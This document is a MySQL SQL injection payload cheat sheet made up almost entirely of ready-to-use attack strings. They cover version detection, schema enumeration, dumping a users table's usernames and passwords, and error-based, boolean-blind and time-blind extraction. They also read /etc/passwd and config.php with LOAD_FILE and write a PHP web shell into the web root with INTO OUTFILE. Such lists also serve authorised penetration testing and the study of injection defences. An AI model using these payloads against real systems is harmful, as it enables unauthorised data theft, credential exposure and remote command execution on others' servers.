# MySQL Specific Payloads

## Version Detection
```
' UNION SELECT @@version--
' AND (SELECT VERSION())>0--
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
```

## Database Enumeration
```
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--
```

## Error-Based Extraction (MySQL)
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## Blind - Boolean
```
' AND LENGTH(database())=8--
' AND ASCII(SUBSTRING(database(),1,1))=116--
' AND (SELECT LENGTH(username) FROM users LIMIT 1)=5--
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97--
```

## Blind - Time
```
' AND IF(LENGTH(database())=8,SLEEP(3),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=116,SLEEP(3),0)--
' AND IF((SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0,SLEEP(3),0)--
```

## File Operations (MySQL)
```
' UNION SELECT LOAD_FILE('/etc/passwd)--
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

## Privilege Check
```
' UNION SELECT user()--
' UNION SELECT current_user()--
' UNION SELECT super_priv FROM mysql.user WHERE user='root'--
' UNION SELECT grant_priv FROM mysql.user WHERE user='root'--
```

## Common System Tables
```
information_schema.schemata     -- Database names
information_schema.tables       -- Table names
information_schema.columns      -- Column names
mysql.user                      -- User accounts
mysql.db                        -- Database privileges
```
